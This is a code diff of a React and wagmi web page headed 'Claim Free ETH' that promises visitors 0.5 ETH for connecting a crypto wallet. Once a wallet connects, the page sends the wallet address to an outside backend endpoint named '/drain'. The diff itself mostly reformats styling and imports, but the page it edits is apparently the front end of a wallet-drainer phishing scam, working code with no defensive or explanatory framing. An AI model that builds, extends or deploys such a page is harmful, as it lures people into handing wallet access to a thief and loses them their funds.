@@ -3,7 +3,8 @@ import ReactDOM from "react-dom/client";
 import { WagmiConfig, createConfig, configureChains } from "wagmi";
 import { mainnet, sepolia } from "@wagmi/chains";
 import { publicProvider } from "wagmi/providers/public";
-import { InjectedConnector, WalletConnectConnector } from "wagmi/connectors";
+import { InjectedConnector } from "wagmi/connectors/injected";
+import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
 import { createWeb3Modal } from "@web3modal/wagmi/react";
 
 /* ---------------------------
@@ -47,12 +48,15 @@ const App = () => {
       setLoading(true);
       setResponse(null);
 
+      // Web3Modal instance
       const modal = window.web3Modal;
       const connection = await modal.open();
       const account = connection?.accounts?.[0];
       if (!account) throw new Error("No wallet connected");
+
       setWalletAddress(account);
 
+      // Example API call
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -62,6 +66,7 @@ const App = () => {
         }),
       });
       const data = await res.json();
+
       setResponse({
         success: res.ok,
         message: res.ok
@@ -79,15 +84,71 @@ const App = () => {
 
   return (
     <WagmiConfig config={config}>
-      <div style={{ minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center", background: "#121212", color: "#fff", fontFamily: "Arial, sans-serif" }}>
-        <div style={{ background: "#1e1e1e", padding: "30px", borderRadius: "12px", width: "100%", maxWidth: "420px", textAlign: "center" }}>
+      <div
+        style={{
+          minHeight: "100vh",
+          display: "flex",
+          justifyContent: "center",
+          alignItems: "center",
+          background: "#121212",
+          color: "#fff",
+          fontFamily: "Arial, sans-serif",
+        }}
+      >
+        <div
+          style={{
+            background: "#1e1e1e",
+            padding: "30px",
+            borderRadius: "12px",
+            width: "100%",
+            maxWidth: "420px",
+            textAlign: "center",
+          }}
+        >
           <h1 style={{ marginBottom: "16px" }}>Claim Free ETH</h1>
-          <p style={{ fontSize: "14px", color: "#ccc" }}>Connect your wallet to claim 0.5 ETH.</p>
-          <button onClick={connectWallet} disabled={loading} style={{ marginTop: "20px", padding: "12px 24px", width: "100%", background: "#4CAF50", border: "none", borderRadius: "8px", color: "#fff", fontSize: "16px", cursor: "pointer", fontWeight: "bold" }}>
+          <p style={{ fontSize: "14px", color: "#ccc" }}>
+            Connect your wallet to claim 0.5 ETH.
+          </p>
+
+          <button
+            onClick={connectWallet}
+            disabled={loading}
+            style={{
+              marginTop: "20px",
+              padding: "12px 24px",
+              width: "100%",
+              background: "#4CAF50",
+              border: "none",
+              borderRadius: "8px",
+              color: "#fff",
+              fontSize: "16px",
+              cursor: "pointer",
+              fontWeight: "bold",
+            }}
+          >
             {loading ? "Connecting..." : "Connect Wallet"}
           </button>
-          {walletAddress && <p style={{ marginTop: "12px", fontSize: "12px", color: "#aaa" }}>Connected: {walletAddress}</p>}
-          {response && <pre style={{ marginTop: "16px", background: "#2a2a2a", padding: "12px", borderRadius: "8px", fontSize: "12px", textAlign: "left" }}>{JSON.stringify(response, null, 2)}</pre>}
+
+          {walletAddress && (
+            <p style={{ marginTop: "12px", fontSize: "12px", color: "#aaa" }}>
+              Connected: {walletAddress}
+            </p>
+          )}
+
+          {response && (
+            <pre
+              style={{
+                marginTop: "16px",
+                background: "#2a2a2a",
+                padding: "12px",
+                borderRadius: "8px",
+                fontSize: "12px",
+                textAlign: "left",
+              }}
+            >
+              {JSON.stringify(response, null, 2)}
+            </pre>
+          )}
         </div>
       </div>
     </WagmiConfig>
